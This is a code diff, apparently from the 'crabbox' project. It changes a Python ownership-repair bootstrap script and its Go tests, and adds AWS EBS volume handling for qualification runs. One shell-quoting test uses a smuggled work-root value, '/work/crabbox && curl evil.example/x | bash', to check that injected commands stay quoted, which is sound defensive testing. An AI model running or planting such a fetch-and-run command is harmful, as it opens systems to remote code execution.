@@ -1,0 +1,3738 @@
+diff --git a/internal/cli/bootstrap_generated.go b/internal/cli/bootstrap_generated.go
+index 948b3602b0d1b6c53ad8c66618e9f28d1c5e30c2..53f38fad0bd86c15ee25ccd5c60aa851ae1fdcaf 100644
+--- a/internal/cli/bootstrap_generated.go
++++ b/internal/cli/bootstrap_generated.go
+@@ -80,7 +80,7 @@ func sharedLinuxSSHRestart() string {
+ }
+ 
+ func sharedLinuxOwnershipRepair(user string, roots []string) string {
+-	return "# Resolve the original user:same-named-group contract to numeric IDs once.\n# Keep traversal and updates anchored to directory descriptors; never follow symlinks.\nPATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - " + bootstrapShellQuote(user) + " " + bootstrapQuoteWords(roots, bootstrapShellQuote, " ") + " <<'CRABBOX_OWNERSHIP'\nimport grp\nimport os\nimport pwd\nimport resource\nimport stat\nimport sys\n\nuid = pwd.getpwnam(sys.argv[1]).pw_uid\ngid = grp.getgrnam(sys.argv[1]).gr_gid\n# systemd normally starts services with a 1024 soft limit. This child uses\n# descriptors instead of following mutable ancestor paths; allow its inherited\n# hard limit without changing the bootstrap shell or any system-wide limit.\nsoft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)\nif soft_limit != hard_limit:\n    resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))\n\ndef repair(name, directory_fd):\n    info = os.stat(name, dir_fd=directory_fd, follow_symlinks=False)\n    if info.st_uid != uid or info.st_gid != gid:\n        os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)\n    return stat.S_ISDIR(info.st_mode)\n\ndef descend(name, parent_fd):\n    directory_fd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd)\n    try:\n        return directory_fd, os.scandir(directory_fd)\n    except BaseException:\n        os.close(directory_fd)\n        raise\n\nfor root in sys.argv[2:]:\n    parent, name = os.path.split(root)\n    parent_fd = os.open(parent or \".\", os.O_RDONLY | os.O_DIRECTORY)\n    stack = []\n    try:\n        if repair(name or \".\", parent_fd):\n            stack.append(descend(name or \".\", parent_fd))\n        # An explicit stack also supports trees deeper than Python's recursion limit.\n        while stack:\n            directory_fd, iterator = stack[-1]\n            entry = next(iterator, None)\n            if entry is None:\n                iterator.close()\n                os.close(directory_fd)\n                stack.pop()\n            elif repair(entry.name, directory_fd):\n                stack.append(descend(entry.name, directory_fd))\n    finally:\n        for directory_fd, iterator in reversed(stack):\n            iterator.close()\n            os.close(directory_fd)\n        os.close(parent_fd)\nCRABBOX_OWNERSHIP\n"
++	return "# Resolve the original user:same-named-group contract to numeric IDs once.\n# Keep traversal and updates anchored to directory descriptors; never follow symlinks.\n# The fixed argv label lets read-only observers distinguish this child from other Python.\nPATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - crabbox-ownership-repair-v1 " + bootstrapShellQuote(user) + " " + bootstrapQuoteWords(roots, bootstrapShellQuote, " ") + " <<'CRABBOX_OWNERSHIP'\nimport grp\nimport os\nimport pwd\nimport resource\nimport stat\nimport sys\nimport time\n\nuid = pwd.getpwnam(sys.argv[2]).pw_uid\ngid = grp.getgrnam(sys.argv[2]).gr_gid\n# systemd normally starts services with a 1024 soft limit. This child uses\n# descriptors instead of following mutable ancestor paths; allow its inherited\n# hard limit without changing the bootstrap shell or any system-wide limit.\nsoft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)\nif soft_limit != hard_limit:\n    resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))\n\nvisited = mismatched = changed = 0\n\ndef repair(name, directory_fd):\n    global visited, mismatched, changed\n    info = os.stat(name, dir_fd=directory_fd, follow_symlinks=False)\n    visited += 1\n    if info.st_uid != uid or info.st_gid != gid:\n        mismatched += 1\n        os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)\n        changed += 1\n    return stat.S_ISDIR(info.st_mode)\n\ndef descend(name, parent_fd):\n    directory_fd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd)\n    try:\n        return directory_fd, os.scandir(directory_fd)\n    except BaseException:\n        os.close(directory_fd)\n        raise\n\nstarted = time.monotonic()\nstate = \"failed\"\nprint(\"crabbox ownership-repair state=started\", flush=True)\ntry:\n    for root in sys.argv[3:]:\n        parent, name = os.path.split(root)\n        parent_fd = os.open(parent or \".\", os.O_RDONLY | os.O_DIRECTORY)\n        stack = []\n        try:\n            if repair(name or \".\", parent_fd):\n                stack.append(descend(name or \".\", parent_fd))\n            # An explicit stack also supports trees deeper than Python's recursion limit.\n            while stack:\n                directory_fd, iterator = stack[-1]\n                entry = next(iterator, None)\n                if entry is None:\n                    iterator.close()\n                    os.close(directory_fd)\n                    stack.pop()\n                elif repair(entry.name, directory_fd):\n                    stack.append(descend(entry.name, directory_fd))\n        finally:\n            for directory_fd, iterator in reversed(stack):\n                iterator.close()\n                os.close(directory_fd)\n            os.close(parent_fd)\n    state = \"complete\"\nfinally:\n    # Counts come from this walk, without another inventory or persistent readiness state.\n    print(f\"crabbox ownership-repair state={state} visited={visited} mismatched={mismatched} changed={changed} elapsed_seconds={time.monotonic() - started:.3f}\", flush=True)\nCRABBOX_OWNERSHIP\n"
+ }
+ 
+ func sharedLinuxOptionalPackages() string {
+diff --git a/internal/cli/bootstrap_ownership_linux_test.go b/internal/cli/bootstrap_ownership_linux_test.go
+index 3c9dc0038fa4978ca303649ac3fa602c2b33103a..ac0d1a3f62281efaa6d116a06af829e133c8a038 100644
+--- a/internal/cli/bootstrap_ownership_linux_test.go
++++ b/internal/cli/bootstrap_ownership_linux_test.go
+@@ -1,9 +1,11 @@
+ package cli
+ 
+ import (
++	"fmt"
+ 	"os"
+ 	"os/exec"
+ 	"path/filepath"
++	"strings"
+ 	"syscall"
+ 	"testing"
+ )
+@@ -38,15 +40,17 @@ func ownershipEntries(t *testing.T, root string) map[string]ownershipMetadata {
+ 	return result
+ }
+ 
+-func runOwnershipBlock(t *testing.T, work, cache string) {
++func runOwnershipBlock(t *testing.T, work, cache string) string {
+ 	t.Helper()
+ 	cfg := baseConfig()
+ 	cfg.SSHUser, cfg.WorkRoot, cfg.AWSSnapshot = "root", work, "snap-fixture"
+ 	script := cloudInitOwnershipBlock(t, cfg, cache)
+ 	cmd := exec.Command("bash", "--noprofile", "--norc", "-euo", "pipefail", "-c", script)
+-	if out, err := cmd.CombinedOutput(); err != nil {
++	out, err := cmd.CombinedOutput()
++	if err != nil {
+ 		t.Fatalf("ownership block: %v: %s", err, out)
+ 	}
++	return string(out)
+ }
+ 
+ func TestCloudInitOwnershipFilesystem(t *testing.T) {
+@@ -99,7 +103,15 @@ func TestCloudInitOwnershipFilesystem(t *testing.T) {
+ 				paths[path] = ownershipStat(t, path)
+ 			}
+ 			external := ownershipEntries(t, outside)
+-			runOwnershipBlock(t, work, cache)
++			mismatches := 0
++			for _, before := range paths {
++				if before.uid != 0 || before.gid != 0 {
++					mismatches++
++				}
++			}
++			if out := runOwnershipBlock(t, work, cache); !strings.Contains(out, fmt.Sprintf("state=complete visited=%d mismatched=%d changed=%d elapsed_seconds=", len(paths), mismatches, mismatches)) {
++				t.Fatalf("incorrect ownership summary: %s", out)
++			}
+ 			retained, repaired := 0, 0
+ 			for path, before := range paths {
+ 				after := ownershipStat(t, path)
+@@ -119,7 +131,9 @@ func TestCloudInitOwnershipFilesystem(t *testing.T) {
+ 				}
+ 				paths[path] = after
+ 			}
+-			runOwnershipBlock(t, work, cache)
++			if out := runOwnershipBlock(t, work, cache); !strings.Contains(out, fmt.Sprintf("state=complete visited=%d mismatched=0 changed=0 elapsed_seconds=", len(paths))) {
++				t.Fatalf("incorrect repeat summary: %s", out)
++			}
+ 			for path, before := range paths {
+ 				if after := ownershipStat(t, path); before != after {
+ 					t.Errorf("%s: repeat execution changed metadata", path)
+diff --git a/internal/cli/bootstrap_ownership_test.go b/internal/cli/bootstrap_ownership_test.go
+index 153d12f7e07eb334bf7311de5b4b8c661242fe8a..145b46e2d0556f25de8cc45ed8a7eb90e5e8c745 100644
+--- a/internal/cli/bootstrap_ownership_test.go
++++ b/internal/cli/bootstrap_ownership_test.go
+@@ -54,9 +54,9 @@ func TestCloudInitFiltersNumericOwnership(t *testing.T) {
+ 			}
+ 			script := cloudInitOwnershipBlock(t, cfg, "/tmp/cache")
+ 			for _, want := range []string{
+-				"PATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - 'crabbox' '/work/fixture'\\''s tree' '/tmp/cache'",
+-				"uid = pwd.getpwnam(sys.argv[1]).pw_uid",
+-				"gid = grp.getgrnam(sys.argv[1]).gr_gid",
++				"PATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - crabbox-ownership-repair-v1 'crabbox' '/work/fixture'\\''s tree' '/tmp/cache'",
++				"uid = pwd.getpwnam(sys.argv[2]).pw_uid",
++				"gid = grp.getgrnam(sys.argv[2]).gr_gid",
+ 				"if info.st_uid != uid or info.st_gid != gid:",
+ 				"os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)",
+ 				"os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd",
+diff --git a/internal/cli/bootstrap_test.go b/internal/cli/bootstrap_test.go
+index 458078e146313db4abf8ae53ed9753f9960d313f..493fab0f4c8f8f303dd4f646c5887d1bbbeb5b35 100644
+--- a/internal/cli/bootstrap_test.go
++++ b/internal/cli/bootstrap_test.go
+@@ -162,7 +162,7 @@ func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
+ 	for _, want := range []string{
+ 		"test -w '/work/crabbox && curl evil.example/x | bash'",
+ 		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
+-		"python3 -I - 'crabbox' '/work/crabbox && curl evil.example/x | bash' '/var/cache/crabbox' ",
++		"python3 -I - crabbox-ownership-repair-v1 'crabbox' '/work/crabbox && curl evil.example/x | bash' '/var/cache/crabbox' ",
+ 	} {
+ 		if !strings.Contains(got, want) {
+ 			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
+diff --git a/recipes/bootstrap/v1/linuxOwnershipRepair.sh b/recipes/bootstrap/v1/linuxOwnershipRepair.sh
+index 014ce814a2708aef7d591a0e53ea84d1b9a9ca4f..70bc0ebdddaf3f9f6d24f3ce6f0ad3dd8985c446 100644
+--- a/recipes/bootstrap/v1/linuxOwnershipRepair.sh
++++ b/recipes/bootstrap/v1/linuxOwnershipRepair.sh
+@@ -1,15 +1,17 @@
+ # Resolve the original user:same-named-group contract to numeric IDs once.
+ # Keep traversal and updates anchored to directory descriptors; never follow symlinks.
+-PATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - {{user}} {{roots}} <<'CRABBOX_OWNERSHIP'
++# The fixed argv label lets read-only observers distinguish this child from other Python.
++PATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - crabbox-ownership-repair-v1 {{user}} {{roots}} <<'CRABBOX_OWNERSHIP'
+ import grp
+ import os
+ import pwd
+ import resource
+ import stat
+ import sys
++import time
+ 
+-uid = pwd.getpwnam(sys.argv[1]).pw_uid
+-gid = grp.getgrnam(sys.argv[1]).gr_gid
++uid = pwd.getpwnam(sys.argv[2]).pw_uid
++gid = grp.getgrnam(sys.argv[2]).gr_gid
+ # systemd normally starts services with a 1024 soft limit. This child uses
+ # descriptors instead of following mutable ancestor paths; allow its inherited
+ # hard limit without changing the bootstrap shell or any system-wide limit.
+@@ -17,10 +19,16 @@ soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
+ if soft_limit != hard_limit:
+     resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))
+ 
++visited = mismatched = changed = 0
++
+ def repair(name, directory_fd):
++    global visited, mismatched, changed
+     info = os.stat(name, dir_fd=directory_fd, follow_symlinks=False)
++    visited += 1
+     if info.st_uid != uid or info.st_gid != gid:
++        mismatched += 1
+         os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)
++        changed += 1
+     return stat.S_ISDIR(info.st_mode)
+ 
+ def descend(name, parent_fd):
+@@ -31,26 +39,34 @@ def descend(name, parent_fd):
+         os.close(directory_fd)
+         raise
+ 
+-for root in sys.argv[2:]:
+-    parent, name = os.path.split(root)
+-    parent_fd = os.open(parent or ".", os.O_RDONLY | os.O_DIRECTORY)
+-    stack = []
+-    try:
+-        if repair(name or ".", parent_fd):
+-            stack.append(descend(name or ".", parent_fd))
+-        # An explicit stack also supports trees deeper than Python's recursion limit.
+-        while stack:
+-            directory_fd, iterator = stack[-1]
+-            entry = next(iterator, None)
+-            if entry is None:
++started = time.monotonic()
++state = "failed"
++print("crabbox ownership-repair state=started", flush=True)
++try:
++    for root in sys.argv[3:]:
++        parent, name = os.path.split(root)
++        parent_fd = os.open(parent or ".", os.O_RDONLY | os.O_DIRECTORY)
++        stack = []
++        try:
++            if repair(name or ".", parent_fd):
++                stack.append(descend(name or ".", parent_fd))
++            # An explicit stack also supports trees deeper than Python's recursion limit.
++            while stack:
++                directory_fd, iterator = stack[-1]
++                entry = next(iterator, None)
++                if entry is None:
++                    iterator.close()
++                    os.close(directory_fd)
++                    stack.pop()
++                elif repair(entry.name, directory_fd):
++                    stack.append(descend(entry.name, directory_fd))
++        finally:
++            for directory_fd, iterator in reversed(stack):
+                 iterator.close()
+                 os.close(directory_fd)
+-                stack.pop()
+-            elif repair(entry.name, directory_fd):
+-                stack.append(descend(entry.name, directory_fd))
+-    finally:
+-        for directory_fd, iterator in reversed(stack):
+-            iterator.close()
+-            os.close(directory_fd)
+-        os.close(parent_fd)
++            os.close(parent_fd)
++    state = "complete"
++finally:
++    # Counts come from this walk, without another inventory or persistent readiness state.
++    print(f"crabbox ownership-repair state={state} visited={visited} mismatched={mismatched} changed={changed} elapsed_seconds={time.monotonic() - started:.3f}", flush=True)
+ CRABBOX_OWNERSHIP
+diff --git a/worker/src/aws-first-walk.ts b/worker/src/aws-first-walk.ts
+new file mode 100644
+index 0000000000000000000000000000000000000000..4211b953450731cbe4bbdfbe63573c764fbd99ca
+--- /dev/null
++++ b/worker/src/aws-first-walk.ts
+@@ -0,0 +1,268 @@
++import { XMLParser } from "fast-xml-parser";
++
++import type {
++  AWSQualificationFirstWalkRequest,
++  AWSQualificationFirstWalkStatus,
++  AWSQualificationRunIdentity,
++} from "./aws-qualification-contract";
++import { sha256Hex } from "./encoding";
++
++// State belongs to AWSQualificationRun, including after a failed/uncertain RPC.
++export const firstWalkKey = "first-walk";
++export const firstWalkDevice = "/dev/sdf";
++export interface FirstWalkState {
++  request: AWSQualificationFirstWalkRequest;
++  phase: "prepared" | "creating" | "created" | "attaching" | "attached";
++  zone: string;
++  sizeGB: number;
++  volumeID?: string;
++}
++export interface FirstWalkOwner {
++  identity: AWSQualificationRunIdentity;
++  accountID: string;
++  read(): Promise<FirstWalkState | undefined>;
++  write(state: FirstWalkState): Promise<void>;
++  query(action: string, parameters: Record<string, string>, mutating?: boolean): Promise<string>;
++}
++const parser = new XMLParser({ parseTagValue: false });
++type ObjectRecord = Record<string, unknown>;
++const obj = (value: unknown): ObjectRecord =>
++  value !== null && typeof value === "object" ? (value as ObjectRecord) : {};
++const list = (value: unknown): ObjectRecord[] =>
++  (value === undefined ? [] : Array.isArray(value) ? value : [value]).map(obj);
++const str = (value: unknown): string => (typeof value === "string" ? value : "");
++function root(body: string, action: string): ObjectRecord {
++  return obj(obj(parser.parse(body))[`${action}Response`]);
++}
++function tags(value: unknown): Map<string, string> {
++  return new Map(list(obj(value)["item"]).map((tag) => [str(tag["key"]), str(tag["value"])]));
++}
++function ownerTags(owner: FirstWalkOwner): Record<string, string> {
++  const values = {
++    crabbox_qualification_run: owner.identity.runId,
++    crabbox_qualification_owner: owner.identity.owner,
++    crabbox_qualification_sha: owner.identity.candidateSha,
++    crabbox_qualification_expiry: owner.identity.expiresAt,
++    crabbox_qualification_op: "first-walk-data",
++  };
++  return Object.fromEntries(
++    Object.entries(values).flatMap(([key, value], i) => [
++      [`TagSpecification.1.Tag.${i + 1}.Key`, key],
++      [`TagSpecification.1.Tag.${i + 1}.Value`, value],
++    ]),
++  );
++}
++async function instance(owner: FirstWalkOwner, id: string): Promise<ObjectRecord> {
++  const body = await owner.query("DescribeInstances", { "InstanceId.1": id });
++  const reservations = list(obj(root(body, "DescribeInstances")["reservationSet"])["item"]);
++  if (reservations.length !== 1 || str(reservations[0]?.["ownerId"]) !== owner.accountID)
++    throw new Error("first-walk instance account is not verified");
++  const entries = list(obj(reservations[0]?.["instancesSet"])["item"]);
++  const entry = entries[0];
++  if (
++    entries.length !== 1 ||
++    str(entry?.["instanceId"]) !== id ||
++    str(obj(entry?.["instanceState"])["name"]) !== "running" ||
++    tags(entry?.["tagSet"]).get("crabbox_qualification_run") !== owner.identity.runId
++  )
++    throw new Error("first-walk instance is not the exact running owned instance");
++  return entry!;
++}
++function verifyVolume(owner: FirstWalkOwner, state: FirstWalkState, volume: ObjectRecord): void {
++  const labels = tags(volume["tagSet"]);
++  if (
++    !/^vol-[a-f0-9]+$/.test(str(volume["volumeId"])) ||
++    (state.volumeID && str(volume["volumeId"]) !== state.volumeID) ||
++    str(volume["snapshotId"]) !== state.request.snapshotID ||
++    str(volume["availabilityZone"]) !== state.zone ||
++    Number(volume["size"]) !== state.sizeGB ||
++    str(volume["volumeType"]) !== "gp3" ||
++    str(volume["encrypted"]) !== "true" ||
++    Number(volume["iops"]) !== 3000 ||
++    Number(volume["throughput"]) !== 125 ||
++    labels.get("crabbox_qualification_run") !== owner.identity.runId ||
++    labels.get("crabbox_qualification_owner") !== owner.identity.owner ||
++    labels.get("crabbox_qualification_sha") !== owner.identity.candidateSha ||
++    labels.get("crabbox_qualification_expiry") !== owner.identity.expiresAt ||
++    labels.get("crabbox_qualification_op") !== "first-walk-data"
++  )
++    throw new Error("first-walk volume identity or policy mismatch");
++}
++async function discover(owner: FirstWalkOwner, state: FirstWalkState): Promise<ObjectRecord[]> {
++  const parameters = state.volumeID
++    ? { "VolumeId.1": state.volumeID }
++    : {
++        "Filter.1.Name": "tag:crabbox_qualification_run",
++        "Filter.1.Value.1": owner.identity.runId,
++        "Filter.2.Name": "tag:crabbox_qualification_op",
++        "Filter.2.Value.1": "first-walk-data",
++      };
++  const body = await owner.query("DescribeVolumes", parameters);
++  const response = root(body, "DescribeVolumes");
++  if (response["nextToken"]) throw new Error("first-walk volume inventory is paginated");
++  const entries = list(obj(response["volumeSet"])["item"]);
++  if (entries.length > 1) throw new Error("first-walk volume inventory exceeds one copy");
++  for (const entry of entries) verifyVolume(owner, state, entry);
++  return entries;
++}
++export function firstWalkStatus(
++  identity: AWSQualificationRunIdentity,
++  state: FirstWalkState | undefined,
++  finalized: boolean,
++): AWSQualificationFirstWalkStatus {
++  return {
++    runID: identity.runId,
++    deploymentHash: identity.deploymentHash,
++    finalized,
++    ...(state
++      ? {
++          request: state.request,
++          phase: state.phase,
++          volumeID: state.volumeID,
++          device: firstWalkDevice,
++        }
++      : {}),
++  };
++}
++export async function prepareFirstWalk(
++  owner: FirstWalkOwner,
++  request: AWSQualificationFirstWalkRequest,
++): Promise<FirstWalkState> {
++  let state = await owner.read();
++  if (state && JSON.stringify(state.request) !== JSON.stringify(request))
++    throw new Error("first-walk request is immutable");
++  const guest = await instance(owner, request.instanceID);
++  if (!state) {
++    const mappings = list(obj(guest["blockDeviceMapping"])["item"]);
++    if (mappings.filter((m) => str(obj(m["ebs"])["volumeId"])).length !== 1)
++      throw new Error("first-walk requires a stock instance with one root EBS volume");
++    if (mappings.some((m) => str(m["deviceName"]) === firstWalkDevice))
++      throw new Error("first-walk device is already occupied");
++    const body = await owner.query("DescribeSnapshots", {
++      "SnapshotId.1": request.snapshotID,
++      "Owner.1": "self",
++    });
++    const entries = list(obj(root(body, "DescribeSnapshots")["snapshotSet"])["item"]);
++    const capture = entries[0];
++    const sizeGB = Number(capture?.["volumeSize"]);
++    if (
++      entries.length !== 1 ||
++      str(capture?.["snapshotId"]) !== request.snapshotID ||
++      str(capture?.["ownerId"]) !== owner.accountID ||
++      str(capture?.["status"]) !== "completed" ||
++      !Number.isInteger(sizeGB) ||
++      sizeGB < 1 ||
++      sizeGB > 400
++    )
++      throw new Error("first-walk capture is not a single owned completed snapshot up to 400 GiB");
++    const zone = str(obj(guest["placement"])["availabilityZone"]);
++    if (!/^[a-z]{2}-[a-z]+-\d[a-z]$/.test(zone)) throw new Error("first-walk AZ is not verified");
++    state = { request, phase: "prepared", zone, sizeGB };
++    await owner.write(state);
++  }
++  if (state.phase === "prepared") {
++    // Persist before dispatch. Even an empty reconciliation after uncertainty never
++    // authorizes another CreateVolume; the owner must finalize this run instead.
++    state.phase = "creating";
++    await owner.write(state);
++    const response = await owner.query(
++      "CreateVolume",
++      {
++        AvailabilityZone: state.zone,
++        SnapshotId: request.snapshotID,
++        Size: String(state.sizeGB),
++        VolumeType: "gp3",
++        Iops: "3000",
++        Throughput: "125",
++        Encrypted: "true",
++        ClientToken: await sha256Hex(`${owner.identity.runId}:first-walk-data`),
++        "TagSpecification.1.ResourceType": "volume",
++        ...ownerTags(owner),
++      },
++      true,
++    );
++    const id = str(root(response, "CreateVolume")["volumeId"]);
++    if (!/^vol-[a-f0-9]+$/.test(id))
++      throw new Error("first-walk create returned no exact volume ID");
++    state.volumeID = id;
++    await owner.write(state);
++  }
++  const volumes = await discover(owner, state);
++  if (volumes.length !== 1)
++    throw new Error("first-walk create outcome unresolved; finalize instead of replacing");
++  const volume = volumes[0]!;
++  state.volumeID = str(volume["volumeId"]);
++  const attachments = list(obj(volume["attachmentSet"])["item"]);
++  if (
++    attachments.length > 1 ||
++    attachments.some(
++      (a) => str(a["instanceId"]) !== request.instanceID || str(a["device"]) !== firstWalkDevice,
++    )
++  )
++    throw new Error("first-walk attachment identity mismatch");
++  if (state.phase === "creating") {
++    state.phase = "created";
++    await owner.write(state);
++  }
++  if (!attachments.length) {
++    if (state.phase !== "created" || str(volume["status"]) !== "available")
++      throw new Error("first-walk volume/attachment not ready; retry reads or finalize");
++    state.phase = "attaching";
++    await owner.write(state);
++    await owner.query(
++      "AttachVolume",
++      { VolumeId: state.volumeID, InstanceId: request.instanceID, Device: firstWalkDevice },
++      true,
++    );
++    throw new Error("first-walk attachment dispatched; retry for readback");
++  }
++  if (str(attachments[0]?.["status"]) !== "attached")
++    throw new Error("first-walk attachment not yet settled");
++  const current = await instance(owner, request.instanceID);
++  const mapping = list(obj(current["blockDeviceMapping"])["item"]).find(
++    (m) => str(m["deviceName"]) === firstWalkDevice,
++  );
++  if (str(obj(mapping?.["ebs"])["volumeId"]) !== state.volumeID)
++    throw new Error("first-walk instance mapping mismatch");
++  if (str(obj(mapping?.["ebs"])["deleteOnTermination"]) !== "true") {
++    await owner.query(
++      "ModifyInstanceAttribute",
++      {
++        InstanceId: request.instanceID,
++        "BlockDeviceMapping.1.DeviceName": firstWalkDevice,
++        "BlockDeviceMapping.1.Ebs.VolumeId": state.volumeID,
++        "BlockDeviceMapping.1.Ebs.DeleteOnTermination": "true",
++      },
++      true,
++    );
++    throw new Error("first-walk delete-on-termination requires readback");
++  }
++  state.phase = "attached";
++  await owner.write(state);
++  return state;
++}
++
++// Called only by fenced finalization, AFTER the instance termination request.
++// Never force-detach a mounted filesystem. Termination settles all guest writers;
++// a busy volume leaves the run/pin pending and the existing alarm retries cleanup.
++export async function cleanupFirstWalk(owner: FirstWalkOwner): Promise<string[]> {
++  const state = await owner.read();
++  if (!state) return [];
++  let entries: ObjectRecord[];
++  try {
++    entries = await discover(owner, state);
++  } catch (error) {
++    if (state.volumeID && String(error).includes("InvalidVolume.NotFound")) return [state.volumeID];
++    throw error;
++  }
++  const ids: string[] = [];
++  for (const volume of entries) {
++    const id = str(volume["volumeId"]);
++    ids.push(id);
++    if (list(obj(volume["attachmentSet"])["item"]).length || str(volume["status"]) !== "available")
++      throw new Error("first-walk copy still attached or busy");
++    // oxlint-disable-next-line eslint/no-await-in-loop -- settle each exact owned volume before proceeding.
++    await owner.query("DeleteVolume", { VolumeId: id }, true);
++  }
++  return ids;
++}
+diff --git a/worker/src/aws-qualification-authority.ts b/worker/src/aws-qualification-authority.ts
+index ad26506d6077acc49a4da6f4b1397d7cea6d21be..1f342950e9139147c0031b53b5f3779d6b519ad7 100644
+--- a/worker/src/aws-qualification-authority.ts
++++ b/worker/src/aws-qualification-authority.ts
+@@ -2,14 +2,30 @@ import { AwsClient } from "aws4fetch";
+ import { DurableObject, WorkerEntrypoint } from "cloudflare:workers";
+ import { XMLParser } from "fast-xml-parser";
+ 
++import {
++  parseQualificationNetwork,
++  verifyQualificationGuest,
++  verifyQualificationNetwork,
++  type QualificationNetwork,
++} from "../../scripts/image-qualification-network";
++import {
++  cleanupFirstWalk,
++  firstWalkKey,
++  firstWalkStatus,
++  prepareFirstWalk,
++  type FirstWalkOwner,
++  type FirstWalkState,
++} from "./aws-first-walk";
+ import {
+   awsQualificationAttestationVersion,
+   awsQualificationCleanupReserveMs,
+   awsQualificationInstanceTypes,
++  awsQualificationFirstWalkRunMs,
+   awsQualificationMaxRunMs,
+   awsQualificationRetainedRootGB,
+   awsQualificationRetainedRunMs,
+   type AWSQualificationAttestation,
++  type AWSQualificationBindingIdentity,
+   type AWSQualificationControllerProps,
+   type AWSQualificationFinalReceipt,
+   type AWSQualificationOperationEvidence,
+@@ -19,6 +35,12 @@ import {
+   type AWSQualificationResponse,
+   type AWSQualificationRunIdentity,
+   type AWSQualificationService,
++  type AWSQualificationTransportProbe,
++  type AWSQualificationTransportProbeRequest,
++} from "./aws-qualification-contract";
++import type {
++  AWSQualificationFirstWalkRequest,
++  AWSQualificationFirstWalkStatus,
+ } from "./aws-qualification-contract";
+ import { requireAWSRegion } from "./aws-region";
+ import { sha256Hex } from "./encoding";
+@@ -61,7 +83,7 @@ const parser = new XMLParser({
+   // AWS account IDs are decimal-looking identifiers. Undefined preserves their lexical form.
+   tagValueProcessor: (_tagName, _value, jPath) =>
+     jPath === "GetCallerIdentityResponse.GetCallerIdentityResult.Account" ||
+-    jPath === "DescribeInstancesResponse.reservationSet.item.ownerId" ||
++    _tagName === "ownerId" ||
+     jPath === "DescribeImagesResponse.imagesSet.item.imageOwnerId" ||
+     jPath === "DescribeSnapshotsResponse.snapshotSet.item.ownerId"
+       ? undefined
+@@ -123,10 +145,12 @@ const preservedTagKeys = new Set([
+ ]);
+ 
+ interface AWSQualificationAuthorityEnv {
++  CF_VERSION_METADATA?: { id: string };
+   AWS_ACCESS_KEY_ID?: string;
+   AWS_SECRET_ACCESS_KEY?: string;
+   AWS_SESSION_TOKEN?: string;
+   CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID?: string;
++  CRABBOX_AWS_QUALIFICATION_ROLE_ARN?: string;
+   CRABBOX_AWS_QUALIFICATION_AUTHORITY_SHA?: string;
+   CRABBOX_AWS_QUALIFICATION_AUTHORITY_VERSION?: string;
+   CRABBOX_AWS_QUALIFICATION_BASE_AMI_ID?: string;
+@@ -134,17 +158,20 @@ interface AWSQualificationAuthorityEnv {
+   CRABBOX_AWS_QUALIFICATION_ROOT_GB?: string;
+   CRABBOX_AWS_QUALIFICATION_SECURITY_GROUP_ID?: string;
+   CRABBOX_AWS_QUALIFICATION_SUBNET_ID?: string;
++  CRABBOX_AWS_QUALIFICATION_NETWORK_JSON?: string;
+   AWS_QUALIFICATION_RUNS: DurableObjectNamespace<AWSQualificationRun>;
+   AWS_QUALIFICATION_REGISTRY: DurableObjectNamespace<AWSQualificationRegistry>;
+ }
+ 
+ interface AWSQualificationPolicy {
+   accountId: string;
++  roleArn: string;
+   baseAmiId: string;
+   region: string;
+   rootGB: number;
+   securityGroupId: string;
+   subnetId: string;
++  network?: QualificationNetwork;
+ }
+ 
+ interface AWSQualificationRunState {
+@@ -156,6 +183,8 @@ interface AWSQualificationRunState {
+   authorityVersion: string;
+   policy: AWSQualificationPolicy;
+   policyHash: string;
++  // Cleanup-only upgrade binding; never rewrite the legacy policy or its hash.
++  legacyCleanupRoleArn?: string;
+   retainedRootDeviceName?: string;
+   finalizationSource?: "automatic" | "controller";
+   finalizingAt?: string;
+@@ -211,10 +240,42 @@ export class AWSQualificationTransport extends WorkerEntrypoint<
+   AWSQualificationAuthorityEnv,
+   AWSQualificationRunIdentity
+ > {
++  // The candidate supplies only a nonce. Props and executing version come from
++  // this actual capability invocation, never from the HTTP relay or its reply.
++  async observeBinding(challenge: string): Promise<void> {
++    if (
++      arguments.length !== 1 ||
++      typeof challenge !== "string" ||
++      !/^[0-9a-f]{64}$/.test(challenge)
++    )
++      throw new Error("invalid transport probe arguments");
++    validateExactTransportIdentity(this.ctx.props);
++    await qualificationRegistry(this.env).observeTransport(
++      this.ctx.props,
++      challenge,
++      this.env.CF_VERSION_METADATA?.id,
++    );
++  }
++
+   async execute(request: AWSQualificationRequest): Promise<AWSQualificationResponse> {
+     await qualificationRegistry(this.env).assertActive(this.ctx.props);
+     return await qualificationRun(this.env, this.ctx.props.runId).execute(this.ctx.props, request);
+   }
++
++  async prepareFirstWalk(
++    request: AWSQualificationFirstWalkRequest,
++  ): Promise<AWSQualificationFirstWalkStatus> {
++    await qualificationRegistry(this.env).assertActive(this.ctx.props);
++    return await qualificationRun(this.env, this.ctx.props.runId).prepareFirstWalk(
++      this.ctx.props,
++      request,
++    );
++  }
++
++  // Settlement reads survive the work fence; they never authorize new mutations.
++  async firstWalkStatus(): Promise<AWSQualificationFirstWalkStatus> {
++    return await qualificationRun(this.env, this.ctx.props.runId).firstWalkStatus(this.ctx.props);
++  }
+ }
+ 
